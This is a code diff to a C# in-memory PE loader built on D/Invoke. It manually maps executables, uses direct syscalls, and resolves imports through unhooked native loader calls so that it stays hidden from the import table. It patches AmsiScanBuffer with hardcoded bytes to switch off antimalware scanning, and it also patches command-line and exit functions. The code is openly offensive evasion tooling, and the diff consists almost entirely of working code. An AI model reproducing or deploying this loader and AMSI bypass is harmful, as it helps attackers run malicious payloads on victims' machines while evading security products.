@@ -1,4 +1,4 @@
-﻿/*
+/*
 Dynamic PELoader for x86 and x64  
 */
 
@@ -11,7 +11,7 @@ using static DInvoke.DynamicInvoke.Generic;
 using DInvoke.ManualMap;
 using System.Net;
 using System.Linq;
-
+using System.Diagnostics;
 
 void print(object input) { Console.WriteLine(input); }
 void exit() { Environment.Exit(0); }
@@ -129,24 +129,6 @@ NtClose NtClose = Marshal.GetDelegateForFunctionPointer<NtClose>(ntc);
 IntPtr NtWait; // direct syscall made easy XD, i fuckin love D/Invoke
 if (useSysCalls) { NtWait = GetSyscallStub("NtWaitForSingleObject"); } else { NtWait = GetExportAddress(ntdll.ModuleBase, "NtWaitForSingleObject"); }
 NtWaitForSingleObject NtWaitForSingleObject = Marshal.GetDelegateForFunctionPointer<NtWaitForSingleObject>(NtWait);
-//
-
-
-// VitualProtect (leaving this here in case i need it) 
-//IntPtr VP = GetExportAddress(kernel32.ModuleBase, "VirtualProtect");
-//VirtualProtect VirtualProtect = Marshal.GetDelegateForFunctionPointer<VirtualProtect>(VP);
-
-//
-
-// GetProcAddress and LoadLibrary (i may be stupid, but fixing the IAT won't work without those two)
-// best we could do is hide them from IAT and use unhooked versions of them
-IntPtr getprocaddrr_ptr = GetExportAddress(kernel32.ModuleBase, "GetProcAddress");
-IntPtr loadlib_ptr = GetExportAddress(kernel32.ModuleBase, "LoadLibraryA");
-IntPtr freelib_ptr = GetExportAddress(kernel32.ModuleBase, "FreeLibrary");
-
-GetProcAddr GetFuncAddress = Marshal.GetDelegateForFunctionPointer<GetProcAddr>(getprocaddrr_ptr);
-LoadDll LoadDLL = Marshal.GetDelegateForFunctionPointer<LoadDll>(loadlib_ptr);
-UnLoadDll UnLoadDLL = Marshal.GetDelegateForFunctionPointer<UnLoadDll>(freelib_ptr);
 
 //
 
@@ -168,11 +150,11 @@ void AmziPatcher()
     {
         uint OldProtection = 0;
 
-        IntPtr lib = LoadDLL("amsi.dll");
-        if (lib == IntPtr.Zero) { print("[-] Couldn't find (amsi.dll), skipping AMSI"); }
+        //IntPtr lib = LoadModuleFromDisk("amsi.dll");
+        //if (lib == IntPtr.Zero) { print("[-] Couldn't find (amsi.dll), skipping AMSI"); }
 
-        IntPtr func = GetExportAddress(lib, "AmsiScanBuffer");
-
+        IntPtr func = GetLibraryAddress("amsi.dll", "AmsiScanBuffer", true);
+        
         // return arch appropriat patch, patch from rasta mouse (AmsiBypass.cs)
         byte[] patch = IntPtr.Size == 8 ? new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 } : new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
 
@@ -188,6 +170,7 @@ void AmziPatcher()
 
 }
 AmziPatcher();
+
 
 IMAGE_DOS_HEADER dosHeader = new();
 IMAGE_OPTIONAL_HEADER64 OptionalHeader64 = new();
@@ -350,6 +333,7 @@ print("[*] Performed Relocations");
 // Resolving Imports, Dancing in the IAT 
 
 
+
 int IMBORT_DIRECTORY_TABLE_ENTRY_LENGTH = 20;
 int IDT_IAT_OFFSET = 16;
 int DLL_NAME_RVA_OFFSET = 12;
@@ -370,7 +354,10 @@ for (int DllIndex = 0; DllIndex < NumberOfDlls; DllIndex++)
     IntPtr dllNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(dllNameRva));
     string DllName = Marshal.PtrToStringAnsi(dllNamePtr);
     if (string.IsNullOrEmpty(DllName)) { break; }
-    IntPtr Handle2Dll = LoadDLL(DllName);
+    IntPtr Handle2Dll;
+    if (DllName.ToLower() == "kernel32.dll") { Handle2Dll = kernel32.ModuleBase; } // if the loaded PE uses kernel32, it will use the mapped clean version
+    if (DllName.ToLower() == "ntdll.dll") { Handle2Dll = ntdll.ModuleBase; } // same here for ntdll
+    Handle2Dll = LoadModuleFromDisk(DllName); // LdrLoadDll
 
     int IAT_RVA = Marshal.ReadInt32(pImageImportDescriptor, IDT_IAT_OFFSET);
     IntPtr IATPtr = IntPtr.Add(codebase, IAT_RVA);
@@ -379,10 +366,8 @@ for (int DllIndex = 0; DllIndex < NumberOfDlls; DllIndex++)
     {
         IntPtr DllFuncNamePtr = IntPtr.Add(codebase, Marshal.ReadInt32(IATPtr) + IMPORT_LOOKUP_TABLE_HINT);
         string DllFuncName = Marshal.PtrToStringAnsi(DllFuncNamePtr);
-        if (string.IsNullOrEmpty(DllFuncName)) { break; } // sanity check
-        //print($"{DllName} -> {DllFuncName}");
-        IntPtr FuncAddress = GetFuncAddress(Handle2Dll, DllFuncName);
-
+        if (string.IsNullOrEmpty(DllFuncName)) { break; } // sanity 
+        IntPtr FuncAddress = GetNativeExportAddress(Handle2Dll, DllFuncName); // LdrGetProcedureAddress
         var IntFunctionAddress = Is32bitPE == true ? FuncAddress.ToInt32() : FuncAddress.ToInt64(); ;
         if (Is32bitPE)
         {
@@ -472,7 +457,7 @@ void PatchGetCommandLineX() // reference Invoke-ReflectivePEinjection.ps1, Lines
 
     NtProtectVirtualMemory(new IntPtr(-1), GetCommandLineWaddr, NtTotalSize, PAGE_EXECUTEREAD, OldProtection);
 
-    UnLoadDLL(hKernelBase);
+    
     NtClose(hKernelBase);
     Marshal.FreeHGlobal(CLIAptr);
     Marshal.FreeHGlobal(CLIWptr);
@@ -508,7 +493,6 @@ void Patch_xcmdln() // adding support to Native C/C++ args like (args[0]) to mak
     NtProtectVirtualMemory((IntPtr)(-1), Acmdlineaddr, NtSize, NtOld, NtOld);
 
 
-    UnLoadDLL(hDll);
     NtClose(hDll);
 
     Marshal.FreeHGlobal(NewPtra_cmdln);
@@ -592,8 +576,7 @@ void PatchExit() // guess what, YEP referencing Invoke-ReflectivePEInjection.ps1
         Marshal.FreeHGlobal(DonyBytePtr);
     }
 
-    UnLoadDLL(hMscoree);
-    UnLoadDLL(hkernel32);
+
     NtClose(hMscoree);
     NtClose(hkernel32);
 
@@ -625,7 +608,7 @@ void CleanOnExitEvent() // reason behind is to properly clean the memory on CTRL
     if (!useSysCalls) { Map.FreeModule(ntdll); }
     Map.FreeModule(kernel32);
     print("[*] Freed Mapped DLLs");
-    Environment.Exit(0);
+    Process.GetCurrentProcess().Kill();
 
 }
 
@@ -634,7 +617,7 @@ void ExitEvent()
 {
     Console.CancelKeyPress += (sender, eArgs) => { // on exit , clean up everything
         CleanOnExitEvent();
-        Environment.Exit(0);
+        Process.GetCurrentProcess().Kill();
 
     };
 }
@@ -728,19 +711,5 @@ public delegate uint NtCreateThreadEx(
     IntPtr attributeList
 );
 
-
-[UnmanagedFunctionPointer(CallingConvention.StdCall)]
-public delegate bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpFlOldProtect);
-
 [UnmanagedFunctionPointer(CallingConvention.StdCall)]
 public delegate IntPtr NtWaitForSingleObject(IntPtr HANDLE, bool BOOL, IntPtr Handle);
-
-
-[UnmanagedFunctionPointer(CallingConvention.StdCall)]
-public delegate IntPtr LoadDll(string lpFileName);
-
-[UnmanagedFunctionPointer(CallingConvention.StdCall)]
-public delegate IntPtr UnLoadDll(IntPtr lpHandle);
-
-[UnmanagedFunctionPointer(CallingConvention.StdCall)]
-public delegate IntPtr GetProcAddr(IntPtr hModule, string procName);
